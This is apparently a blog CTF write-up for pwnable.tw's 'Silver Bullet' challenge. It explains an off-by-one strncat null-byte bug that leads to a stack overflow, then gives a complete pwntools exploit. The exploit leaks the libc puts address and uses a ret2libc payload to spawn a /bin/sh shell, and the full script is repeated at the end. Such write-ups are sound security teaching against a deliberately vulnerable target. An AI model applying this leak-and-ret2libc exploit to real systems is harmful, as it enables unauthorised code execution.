---
layout: post
title: Silver Bullet writeup [pwnable.tw]
subtitle: Series of Pwnable.tw Writeups
tag: [pwn, pwnable.tw, writeup]
---

# Silver Bullet

![](https://i.etsystatic.com/5962934/d/il/76350c/2345639591/il_340x270.2345639591_2cgb.jpg)

> Please kill the werewolf with silver bullet!
>
> `nc chall.pwnable.tw 10103`
>
> [silver_bullet](https://github.com/th3-5had0w/CTF-contests/raw/master/pwnable.tw/Silver_Bullet/silver_bullet)
>
> [libc.so](https://github.com/th3-5had0w/CTF-contests/raw/master/pwnable.tw/Silver_Bullet/libc_32.so.6)

- Content:
    - [Vulnerability](#vulnerability)
    - [Exploit](#exploit)

# Vulnerability

After wondering around for a while, i discover a bug in function `power_up`:
```c
int __cdecl power_up(char *dest)
{
  char s[48]; // [esp+0h] [ebp-34h] BYREF
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(s, 0, sizeof(s));
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 12) > 47u )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(s, 48 - *((_DWORD *)dest + 12));
  strncat(dest, s, 48 - *((_DWORD *)dest + 12)); // <-- the vulnerability here
  v3 = strlen(s) + *((_DWORD *)dest + 12);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 12) = v3;
  return puts("Enjoy it !");
}
```

The program allowed to `strncat` upto `n` bytes, which was supposed to be `n-1` bytes, because as strncat manual says:
```If src contains n or more bytes, strncat() writes n+1 bytes to dest (n from  src plus the terminating null byte). Therefore, the size of dest must be at least strlen(dest)+n+1```

## strncat misuse - references:

[[1] Beware of strncpy() and strncat() - eklitzke](https://eklitzke.org/beware-of-strncpy-and-strncat)

[[2] strncpy() and strncat() - Daniel Plakosh](https://us-cert.cisa.gov/bsi/articles/knowledge/coding-practices/strncpy-and-strncat)

From that, we got `1-byte buffer overflow`, where the null-byte will overwrite the size of "the description of the bullet", the size will be reset back to 0, so we can trick the program into concatenating to a string longer than 47 bytes, which will be a buffer overflow ==> We control the `main` function's return pointer (EIP), and also the power of the bullet, after we "kill the wolf", the program execution flow will be redirected to the address we want.

# Exploit

I wrote a code to leak libc and then return back to the main function to get another chance of redirecting the program execution flow. Here we are leaking the libc address of `puts` function
```python
#--init--
print(io.recvuntil(b'choice :'))
io.sendline(b'1')
print(io.recvuntil(b'description of bullet :'))
init_pl = b'A'*47
io.sendline(init_pl)
#--------


#-- phase 1 - leak libc --
payload = b'A'
power_up(payload)
payload = b'A'*7+p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
power_up(payload)
beat()
print(io.recvuntil('Sorry ... It still alive !!'))
beat()
print(io.recvuntil('Oh ! You win !!'))
a = io.recv()
print(a.split(b'\n'))
#-------------------------


#leak libc

libc.address = u32(a.split(b'\n')[1])-libc.sym['puts']
print('[+] Base libc: ', hex(libc.address))

#---------
```

After having the `puts` libc address, we could subtract the offset and got the base address of libc. And from libc base address, we got `system()` address and `/bin/sh` string address.

The program now has been redirected to the `main` function again, reusing the vulnerability, we will spawn a shell:
```python
#-- phase 2 - exploit --

io.sendline(b'1')
print(io.recvuntil(b'description of bullet :'))
init_pl = b'A'*47
io.sendline(init_pl)


payload = b'A'
power_up(payload)
payload = b'A'*7+p32(libc.sym['system'])+p32(libc.sym['exit'])+p32(next(libc.search(b'/bin/sh')))
power_up(payload)
beat()
print(io.recvuntil('Sorry ... It still alive !!'))
beat()
print(io.recvuntil('Oh ! You win !!'))
print(io.recv())
io.interactive()
#-------------------------
```

Wise words from my master: 

> "Instead of `b'A'*7` you could use `b'\xff\xff\xff'+b'A'*4` to kill the wolf in one time"

```python
from pwn import *

io = process('./silver_bullet')
#io = remote('chall.pwnable.tw', 10103)
#libc = ELF('libc_32.so.6')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./silver_bullet')

def power_up(des):
    print(io.recvuntil(b'choice :'))
    io.sendline(b'2')
    print(io.recvuntil(b'description of bullet :'))
    io.sendline(des)

def beat():
    print(io.recv())
    io.sendline(b'3')

#--init--
print(io.recvuntil(b'choice :'))
io.sendline(b'1')
print(io.recvuntil(b'description of bullet :'))
init_pl = b'A'*47
io.sendline(init_pl)
#--------


#-- phase 1 - leak libc --
payload = b'A'
power_up(payload)
payload = b'A'*7+p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
power_up(payload)
beat()
print(io.recvuntil('Sorry ... It still alive !!'))
beat()
print(io.recvuntil('Oh ! You win !!'))
a = io.recv()
print(a.split(b'\n'))
#-------------------------


#leak libc

libc.address = u32(a.split(b'\n')[1])-libc.sym['puts']
print('[+] Base libc: ', hex(libc.address))

#---------


#-- phase 2 - exploit --

io.sendline(b'1')
print(io.recvuntil(b'description of bullet :'))
init_pl = b'A'*47
io.sendline(init_pl)


payload = b'A'
power_up(payload)
payload = b'A'*7+p32(libc.sym['system'])+p32(libc.sym['exit'])+p32(next(libc.search(b'/bin/sh')))
power_up(payload)
beat()
print(io.recvuntil('Sorry ... It still alive !!'))
beat()
print(io.recvuntil('Oh ! You win !!'))
print(io.recv())
io.interactive()
#-------------------------
```